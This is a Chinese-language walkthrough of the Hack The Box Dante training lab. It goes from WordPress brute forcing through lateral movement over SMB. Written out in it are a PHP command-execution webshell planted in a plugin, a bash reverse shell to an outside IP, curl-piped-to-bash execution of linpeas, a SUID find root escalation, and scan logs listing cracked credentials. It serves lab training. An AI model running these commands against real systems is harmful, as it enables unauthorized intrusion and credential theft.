---
title: HTB Dante 靶场 Writeup
date: 2026-08-28 17:00:00
categories:
  - 靶场
tags:
  - HTB
  - Dante
  - 红队
  - 域渗透
description: HTB Dante 靶场 Writeup
---

```plain
入口
10.10.110.0/24
简介
Dante是一个现代化但适合初学者的专业实验室，提供学习常见红队方法论的机会，并熟悉Parrot OS Linux发行版中包含的工具。Dante LLC已聘请您的服务来审计他们的网络。该公司过去未进行全面的渗透测试，希望减少技术债务。他们担心任何实际的泄露都可能导致收入损失和声誉受损。
突破边界后，你需要横向和垂直探索网络，直到获得所有主机的管理权限并达到域管理员权限。你将提升信息收集和态势感知技能，能够利用Windows和Linux缓冲区溢出，熟悉Metasploit框架，以及更多其他内容！
沿途有许多旗帜可以被夺取，有些位于主攻路线上，有些则在支线任务中，你必须去寻找。提交旗帜将推动你进入名人堂，并在此过程中获得徽章作为奖励。
这个红队操作员一级实验室将让玩家接触到：
枚举
漏洞开发
横向移动
特权升级
网络应用攻击
你的入口点在10.10.110.0/24。10.10.110.2 的防火墙不在权限范围内
```

入口：10.10.110.0/24

## linux:10.10.110.100
先扫活机

```plain
sudo nmap -sn 10.10.110.0/24
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-001.png)

10.10.110.2，10.10.110.100(已知10.10.110.2 的防火墙不在权限范围内)

nmap :

+ 21/tcp    open  ftp     vsftpd 3.0.3 <font style="background-color:#EFF0F0;">Anonymous FTP login allowed</font>
+ 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+ 65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

访问[http://10.10.110.100:65000/](http://10.10.110.100:65000/)

dirsearch :

/robots.txt 

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-002.png)

flag1:DANTE{Y0u_Cant_G3t_at_m3_br0!}

/wordpress

/wordpress/wp-login.php

fscan：

```plain
fscan -h 10.10.110.0/24
```



/wordpress

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-003.png)

/wordpress/wp-login.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-004.png)

wpscan扫漏洞

```plain
# -e 枚举，p 插件，t 主题，u 用户
wpscan --url http://10.10.110.100:65000/wordpress -e p,t,u
```

结果：

+ <font style="color:rgb(15, 17, 21);">WordPress 5.4.1</font>
+ <font style="color:rgb(15, 17, 21);">用户：</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">admin</font>`<font style="color:rgb(15, 17, 21);"> 和 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james</font>`<font style="color:rgb(15, 17, 21);"></font>
+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/wp-content/debug.log</font>`<font style="color:rgb(15, 17, 21);">：</font><font style="color:rgb(15, 17, 21);">/var/www/html/wordpress/   wordpress根目录</font>
+ <font style="color:rgb(15, 17, 21);"></font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/wp-content/uploads/</font>`
+ <font style="color:rgb(15, 17, 21);">XML-RPC 开启，可用于暴力破解</font>

爆破：

```plain
wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P /usr/share/wordlists/rockyou.txt --password-attack wp-login --throttle 1
```

<font style="color:rgb(52, 52, 60);">但很久都没爆出来</font>

:::info
<font style="color:rgb(52, 52, 60);">参考 wp,也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。</font>

**<font style="color:rgb(52, 52, 60);">cewl </font>**<font style="color:rgb(52, 52, 60);">是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破</font>

:::

```plain
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
```

```plain
wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P words.txt --password-attack wp-login --throttle 1
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-005.png)

<font style="color:rgb(15, 17, 21);">用户名 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james</font>`<font style="color:rgb(15, 17, 21);">，密码 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">Toyota</font>`

<font style="color:rgb(15, 17, 21);">登录</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-006.png)

ftp:

Anonymous FTP login allowed

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-007.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-008.png)

todo.txt

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-009.png)

<font style="color:rgb(15, 17, 21);">1- 完成 WordPress 权限更改 —— 待处理</font>  
<font style="color:rgb(15, 17, 21);">2- 在切换至端口 80 前，更新链接以使用 DNS 名称 —— 待处理</font>  
<font style="color:rgb(15, 17, 21);">3- 移除其他站点的本地文件包含（LFI）漏洞 —— 待处理</font>  
<font style="color:rgb(15, 17, 21);">4- 将 James 的密码重置为更安全的密码 —— 待处理</font>  
<font style="color:rgb(15, 17, 21);">5- 在初级渗透测试员评估之前加固系统 —— 进行中</font>

**说明****<font style="color:rgb(15, 17, 21);">其他站点</font>****存在****<font style="color:rgb(15, 17, 21);">本地文件包含（LFI）漏洞</font>**

<font style="color:rgb(15, 17, 21);">目前没有找到其他站点，所以还是原来的思路，再wordpress里写码</font>

[<font style="color:rgb(0, 86, 178);">Wordpress - HackTricks</font>](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce)<font style="color:rgb(52, 52, 60);">，主要有以下的几种方法：</font>

1. <font style="color:rgb(52, 52, 60);">修改主题模板。</font>
2. <font style="color:rgb(52, 52, 60);">修改插件文件。</font>
3. <font style="color:rgb(52, 52, 60);">上传插件。</font>

<font style="color:rgb(52, 52, 60);">访问 /wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty 修改 404.php。添加一句话：</font>`<font style="color:rgb(52, 52, 60);">eval($_POST["pass"]);</font>`<font style="color:rgb(52, 52, 60);">，但是有报错，是版本问题</font>

<font style="color:rgb(52, 52, 60);">使用</font><font style="color:rgb(15, 17, 21);">Plugins → Editor写入木马，发现已经有了</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-010.png)

自己又操作一遍

1. 左侧菜单进入「Installed Plugins（已安装插件）」
2. 找到 Akismet Anti-Spam，点击**Deactivate（停用）**
3. 此时插件状态变为`inactive`，再切回「Plugin Editor」编辑`akismet/index.php`

```plain
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-011.png)

可rce

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-012.png)

getshell

```plain
http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/index.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.59/4444 0>%261'
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-013.png)

www-data 普通用户

DANTE-WEB-NIX01主机名

172.16.1.100/24 内网 ip 172.16.1.100

netstat -tulpn:

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-014.png)

有mysql

数据库凭证:

```plain
cat /var/www/html/wordpress/wp-config.php | grep DB_
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-015.png)

**用户名密码：shaun password**

查看用户列表:

```plain
cat /etc/passwd | grep -v nologin
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-016.png)

挂代理，上fscan

```plain
./fscan -h 172.16.1.100/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[1.9s]     已选择服务扫描模式
[1.9s]     开始信息扫描
[1.9s]     CIDR范围: 172.16.1.0-172.16.1.255
[1.9s]     generate_ip_range_full
[1.9s]     解析CIDR 172.16.1.100/24 -> IP范围 172.16.1.0-172.16.1.255
[1.9s]     最终有效主机数量: 256
[1.9s]     开始主机扫描
[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[1.9s]     正在尝试无监听ICMP探测...
[1.9s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted
[1.9s]     当前用户权限不足,无法发送ICMP包
[1.9s]     切换为PING方式探测...
[1.9s] [*] 目标 172.16.1.100    存活 (ICMP)
[1.9s] [*] 目标 172.16.1.101    存活 (ICMP)
[1.9s] [*] 目标 172.16.1.13     存活 (ICMP)
[1.9s] [*] 目标 172.16.1.102    存活 (ICMP)
[1.9s] [*] 目标 172.16.1.10     存活 (ICMP)
[1.9s] [*] 目标 172.16.1.12     存活 (ICMP)
[2.9s] [*] 目标 172.16.1.17     存活 (ICMP)
[2.9s] [*] 目标 172.16.1.19     存活 (ICMP)
[5.0s] [*] 目标 172.16.1.5      存活 (ICMP)
[7.0s]     存活主机数量: 9
[7.0s]     有效端口数量: 233
[7.0s] [*] 端口开放 172.16.1.100:81
[7.0s] [*] 端口开放 172.16.1.100:80
[7.0s] [*] 端口开放 172.16.1.100:22
[7.0s] [*] 端口开放 172.16.1.100:21
[7.0s] [*] 端口开放 172.16.1.101:21
[7.0s] [*] 端口开放 172.16.1.13:445
[7.0s] [*] 端口开放 172.16.1.13:443
[7.0s] [*] 端口开放 172.16.1.13:80
[7.0s] [*] 端口开放 172.16.1.101:139
[7.0s] [*] 端口开放 172.16.1.101:135
[7.0s] [*] 端口开放 172.16.1.101:445
[7.0s] [*] 端口开放 172.16.1.102:445
[7.0s] [*] 端口开放 172.16.1.102:135
[7.0s] [*] 端口开放 172.16.1.102:139
[7.0s] [*] 端口开放 172.16.1.102:443
[7.0s] [*] 端口开放 172.16.1.102:80
[7.0s] [*] 端口开放 172.16.1.102:3306
[7.0s] [*] 端口开放 172.16.1.10:445
[7.0s] [*] 端口开放 172.16.1.10:22
[7.0s] [*] 端口开放 172.16.1.10:80
[7.0s] [*] 端口开放 172.16.1.12:443
[7.0s] [*] 端口开放 172.16.1.17:80
[7.0s] [*] 端口开放 172.16.1.12:3306
[7.0s] [*] 端口开放 172.16.1.17:445
[7.0s] [*] 端口开放 172.16.1.17:139
[7.0s] [*] 端口开放 172.16.1.12:80
[7.0s] [*] 端口开放 172.16.1.12:21
[7.0s] [*] 端口开放 172.16.1.12:22
[7.0s] [*] 端口开放 172.16.1.10:139
[7.0s] [*] 端口开放 172.16.1.19:80
[7.0s] [*] 端口开放 172.16.1.17:10000
[7.0s] [*] 端口开放 172.16.1.5:135
[7.0s] [*] 端口开放 172.16.1.5:445
[7.0s] [*] 端口开放 172.16.1.19:8080
[7.0s] [*] 端口开放 172.16.1.5:139
[7.0s] [*] 端口开放 172.16.1.5:21
[7.0s] [*] 端口开放 172.16.1.5:1433
[10.0s]     扫描完成, 发现 37 个开放端口
[10.0s]     存活端口数量: 37
[10.0s]     开始漏洞扫描
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer
[10.0s] [+] 172.16.1.101 CVE-2020-0796 SmbGhost Vulnerable
[10.0s] [+] 172.16.1.13 CVE-2020-0796 SmbGhost Vulnerable
[10.0s] [*] NetInfo 扫描结果
目标主机: 172.16.1.5
主机名: DANTE-SQL01
发现的网络接口:
   IPv4地址:
      └─ 172.16.1.5
[10.0s] [*] NetInfo 扫描结果
目标主机: 172.16.1.101
主机名: DANTE-WS02
发现的网络接口:
   IPv4地址:
      └─ 172.16.1.101
[10.1s] [+] NetBios 172.16.1.101    WORKGROUP\DANTE-WS02          
[10.1s] [+] NetBios 172.16.1.102    WORKGROUP\DANTE-WS03          
[10.1s] [+] SMB认证成功 172.16.1.17:445 administrator:P@ssword123
[10.1s] [*] NetInfo 扫描结果
目标主机: 172.16.1.102
主机名: DANTE-WS03
发现的网络接口:
   IPv4地址:
      └─ 172.16.1.102
[10.1s] [*] 网站标题 http://172.16.1.102       状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page
[10.1s] [*] 网站标题 http://172.16.1.13        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.13/dashboard/
[10.1s] [*] 网站标题 https://172.16.1.12       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.12/dashboard/
[10.1s] [*] 网站标题 http://172.16.1.100       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works
[10.1s] [*] 网站标题 http://172.16.1.10        状态码:200 长度:28842  标题:Dante Hosting
[10.1s] [+] NetBios 172.16.1.17     WORKGROUP\DANTE-NIX03         
[10.1s] [+] 172.16.1.102 CVE-2020-0796 SmbGhost Vulnerable
[10.1s] [*] 网站标题 http://172.16.1.17        状态码:200 长度:963    标题:Index of /
[10.1s] [*] 网站标题 http://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP
[10.1s] [*] 网站标题 https://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP
[10.1s] [*] 网站标题 http://172.16.1.19        状态码:200 长度:553    标题:Index of /
[10.2s] [*] 网站标题 http://172.16.1.12        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.12/dashboard/
[10.2s]     POC加载完成: 总共387个，成功387个，失败0个
[10.2s] [+] FTP服务 172.16.1.5:21 匿名登录成功!
[10.2s] [*] 网站标题 https://172.16.1.13       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.13/dashboard/
[10.2s] [+] SMB认证成功 172.16.1.10:445 administrator:pass@123
[10.2s] [*] 网站标题 https://172.16.1.102      状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page
[10.2s] [+] NetBios 172.16.1.5      WORKGROUP\DANTE-SQL01               Windows Server 2016 Standard 14393
[10.2s] [*] 网站标题 http://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP
[10.3s] [+] FTP服务 172.16.1.100:21 匿名登录成功!
[10.3s] [*] 网站标题 http://172.16.1.19:8080   状态码:403 长度:793    标题:无标题
[10.3s] [*] 网站标题 https://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP
[10.3s]     SMB2共享信息 172.16.1.17:445 administrator Pass:P@ssword123 共享:[forensics IPC$]
[10.3s] [*] 网站标题 http://172.16.1.17:10000  状态码:200 长度:4622   标题:Login to Webmin
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:123456 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:password 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass: 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass: 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin123 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:Password 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin123 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass@123 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:root 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass123 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass123 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:Password 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:123456 共享:[print$ SlackMigration IPC$]
[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass@123 共享:[forensics IPC$]
[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:P@ssword123 共享:[print$ SlackMigration IPC$]
[10.5s]     SMB2共享信息 172.16.1.17:445 administrator Pass:root 共享:[forensics IPC$]
[10.5s]     SMB2共享信息 172.16.1.10:445 administrator Pass:password 共享:[print$ SlackMigration IPC$]
[mysql] 2026/07/14 03:41:53 connection.go:49: busy buffer
```

###### fscan（部分主机名来自后面的补充）
| <font style="color:rgb(15, 17, 21);">IP地址</font> | <font style="color:rgb(15, 17, 21);">主机名</font> | <font style="color:rgb(15, 17, 21);">关键开放端口</font> | <font style="color:rgb(15, 17, 21);">重要发现 / 漏洞</font> |
| --- | --- | --- | --- |
| <font style="color:#DF2A3F;">172.16.1.100  </font> | <font style="color:#DF2A3F;">DANTE-WEB-NIX01 10.10.110.100(入口机，拿下）</font> | 80.81.22.21 | <font style="color:rgb(15, 17, 21);"> FTP 匿名  </font> |
| <font style="color:#DF2A3F;">172.16.1.101</font> | <font style="color:#DF2A3F;">DANTE-WS02（拿下）</font> | <font style="color:rgb(15, 17, 21);">21, 135, 139, 445</font> | <font style="color:rgb(15, 17, 21);">SmbGhost (CVE-2020-0796)</font><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">漏洞</font> |
| <font style="color:#DF2A3F;">172.16.1.102</font> | <font style="color:#DF2A3F;">DANTE-WS03（拿下）</font> | <font style="color:rgb(15, 17, 21);">80, 135, 139, 443, 445, 3306</font> | <font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行“Dante Marriage Registration System”</font> |
| <font style="color:#DF2A3F;">172.16.1.5</font> | <font style="color:#DF2A3F;">DANTE-SQL01(拿下）</font> | <font style="color:rgb(15, 17, 21);">21, 135, 139, 445, 1433</font> | <font style="color:rgb(15, 17, 21);">FTP 匿名登录成功</font><font style="color:rgb(15, 17, 21);">，Windows Server 2016</font> |
| <font style="color:#DF2A3F;">172.16.1.10</font> | <font style="color:#DF2A3F;">DANTE-NIX02（拿下）</font> | <font style="color:rgb(15, 17, 21);">22, 80, 139, 445</font> | <font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">administrator:pass@123</font>` |
| <font style="color:#DF2A3F;">172.16.1.12</font> | <font style="color:#DF2A3F;">DANTE-NIX04（拿下）</font> | <font style="color:rgb(15, 17, 21);">21, 22, 80, 443, 3306</font> | <font style="color:rgb(15, 17, 21);">运行 XAMPP</font> |
| <font style="color:#DF2A3F;">172.16.1.13</font> | <font style="color:#DF2A3F;">DANTE-WS01（拿下）</font> | <font style="color:rgb(15, 17, 21);">80, 443, 445</font> | <font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行 XAMPP</font> |
| <font style="color:#DF2A3F;">172.16.1.17</font> | <font style="color:#DF2A3F;">DANTE-NIX03（拿下）</font> | <font style="color:rgb(15, 17, 21);">80, 139, 445, 10000</font> | <font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">administrator:P@ssword123</font>`<br/><font style="color:rgb(15, 17, 21);">，运行 Webmin</font> |
| <font style="color:#DF2A3F;">172.16.1.19</font> | <font style="color:#DF2A3F;">DANTE-NIX07（拿下）</font> | <font style="color:rgb(15, 17, 21);">80, 8080</font> | <font style="color:rgb(15, 17, 21);">目录列表 (Index of /)</font> |
| <font style="color:#DF2A3F;">172.16.1.20</font> | <font style="color:#DF2A3F;">DANTE-DC01(拿下）</font> | <font style="color:rgb(15, 17, 21);">445,80,22,139,135,389,443,88</font> | <font style="color:rgb(15, 17, 21);">发现漏洞 172.16.1.20 MS17-010</font> |
| <font style="color:#DF2A3F;">172.16.2.5</font> | <font style="color:#DF2A3F;">DANTE-DC02（拿下）</font> | 88,135,139,445 | <font style="color:rgb(15, 17, 21);"></font> |
| <font style="color:#DF2A3F;">172.16.2.101</font> | <font style="color:#DF2A3F;">DANTE-ADMIN-NIX05（拿下）</font> | 22 | <font style="color:rgb(15, 17, 21);"></font> |
| <font style="color:#DF2A3F;">172.16.2.6</font> | <font style="color:#DF2A3F;">DANTE-ADMIN-NIX06（拿下）</font> | 22 | <font style="color:rgb(15, 17, 21);"></font> |


挂的代理能挂上，但不稳定，很多命令也无权限，先在shell里提权

**<font style="color:rgb(15, 17, 21);background-color:#E8F7CF;">TTY：</font>****<font style="color:rgb(15, 17, 21);background-color:#E8F7CF;">当前 Shell 可能不是完整的终端，先用 Python 生成一个</font>****<font style="color:rgb(15, 17, 21);">：</font>**

```plain
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<font style="color:rgb(15, 17, 21);">执行后，提示符可能会变化，此时再尝试 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">su</font>`<font style="color:rgb(15, 17, 21);">。</font>

<font style="color:rgb(15, 17, 21);">切换至 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james</font>`<font style="color:rgb(15, 17, 21);"> 用户</font>

```plain
su james
```

<font style="color:rgb(15, 17, 21);">输入密码：</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">Toyota</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">，</font><font style="color:rgb(15, 17, 21);">变成 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james</font>`<font style="color:rgb(15, 17, 21);"> 用户，</font><font style="color:rgb(15, 17, 21);">但 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james</font>`<font style="color:rgb(15, 17, 21);"> 没有 sudo 权限，现在需要继续提权</font>

**<font style="color:rgb(15, 17, 21);">切换至 </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">balthazar</font>**`**<font style="color:rgb(15, 17, 21);"> 用户</font>**

<font style="color:rgb(15, 17, 21);">但是没有密码，查找终端历史，找到了mysql的</font>

```plain
mysql -u balthazar -p TheJoker12345!
```

<font style="color:rgb(15, 17, 21);">复用TheJoker12345!密码，登录上了</font>`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">balthazar</font>**`**<font style="color:rgb(15, 17, 21);"> 用户</font>**

<font style="color:rgb(15, 17, 21);">但是权限还是低，还是要提权到root,那就找提权漏洞</font>

**<font style="color:rgb(15, 17, 21);">运行 </font>**`**<font style="color:rgb(15, 17, 21);background-color:#FBF5CB;">linpeas.sh</font>**`**<font style="color:rgb(15, 17, 21);"> 自动化枚举，</font>****<font style="color:rgb(15, 17, 21);">可以快速发现提权路径</font>**

```plain
curl http://10.10.16.59:8000/linpeas.sh | bash > /tmp/linpeas.txt
```

<font style="color:rgb(15, 17, 21);">结果：</font>

1. **<font style="color:rgb(15, 17, 21);">SUID 提权（最简单直接）</font>**
    - `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/usr/bin/find</font>**`<font style="color:rgb(15, 17, 21);"> 设置了 SUID 位。可以利用 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">-exec</font>`<font style="color:rgb(15, 17, 21);"> 参数以 root 身份执行命令</font>
    - `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/usr/bin/pkexec</font>**`<font style="color:rgb(15, 17, 21);"> 也可能存在漏洞 (CVE-2021-4034)</font>
2. **<font style="color:rgb(15, 17, 21);">内核漏洞</font>**
    - <font style="color:rgb(15, 17, 21);">系统内核为 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">5.4.0-29-generic</font>`<font style="color:rgb(15, 17, 21);">，已检测到多个可能存在的内核漏洞，包括 </font>**<font style="color:rgb(15, 17, 21);">CVE-2021-3493 (Ubuntu OverlayFS)</font>**<font style="color:rgb(15, 17, 21);">、</font>**<font style="color:rgb(15, 17, 21);">CVE-2022-32250 (nft_object UAF)</font>**<font style="color:rgb(15, 17, 21);"> 等</font>
3. **<font style="color:rgb(15, 17, 21);">文件与凭证</font>**
    - <font style="color:rgb(15, 17, 21);">发现了 WordPress 的备份配置文件</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/var/www/html/wordpress.bak/wp-config.php</font>`<font style="color:rgb(15, 17, 21);">，其中包含数据库凭证</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">shaun:password</font>`<font style="color:rgb(15, 17, 21);">。</font>
    - <font style="color:rgb(15, 17, 21);">MySQL 以 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">mysql</font>`<font style="color:rgb(15, 17, 21);"> 用户运行，但密码未知</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">balthazar</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">用户目录下存在</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">.ssh</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件夹，可能有私钥。</font>
4. **<font style="color:rgb(15, 17, 21);">计划任务 (Cron)</font>**
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/etc/cron.d/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">中有一个</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">php</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件，但内容未知，需要检查是否有可写的脚本以 root 权限运行。</font>
    - <font style="color:rgb(15, 17, 21);">系统存在 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">anacron</font>`<font style="color:rgb(15, 17, 21);">，可能会定期执行任务</font>

**<font style="color:rgb(15, 17, 21);">利用 SUID </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/usr/bin/find</font>**`**<font style="color:rgb(15, 17, 21);"> 提权</font>**

+ **<font style="color:rgb(15, 17, 21);">原理</font>**<font style="color:rgb(15, 17, 21);">：</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">find</font>`<font style="color:rgb(15, 17, 21);"> 以 SUID root 权限运行，</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">-exec</font>`<font style="color:rgb(15, 17, 21);"> 可以执行任意命令</font>

```plain
find / -type f -exec /bin/bash -p \; -quit
```

<font style="color:rgb(15, 17, 21);"> </font><!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-017.png)

flag2：DANTE{Too_much_Pr1v!!!!}

<font style="color:rgb(52, 52, 60);">james 的 目录下还有一个flag，用这个shell一起拿了</font>

```plain
cat /home/james/flag.txt 
```

flag3 ：DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}

现在要利用之前fscan扫出来的东西横向：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-018.png)

用smb横向

**使用代理扫描内网 SMB 主机**

```plain
proxychains netexec smb 172.16.1.0/24 -u administrator -p pass@123 --shares
```

<font style="color:rgb(15, 17, 21);">关键点：</font>

+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">172.16.1.10</font>`<font style="color:rgb(15, 17, 21);">（DANTE-NIX02）</font><font style="color:rgb(15, 17, 21);">：存在共享</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">SlackMigration</font>`<font style="color:rgb(15, 17, 21);">（只读）。</font>
+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">172.16.1.17</font>`<font style="color:rgb(15, 17, 21);">（DANTE-NIX03）</font><font style="color:rgb(15, 17, 21);">：存在共享</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">forensics</font>`<font style="color:rgb(15, 17, 21);">（读写）。</font>
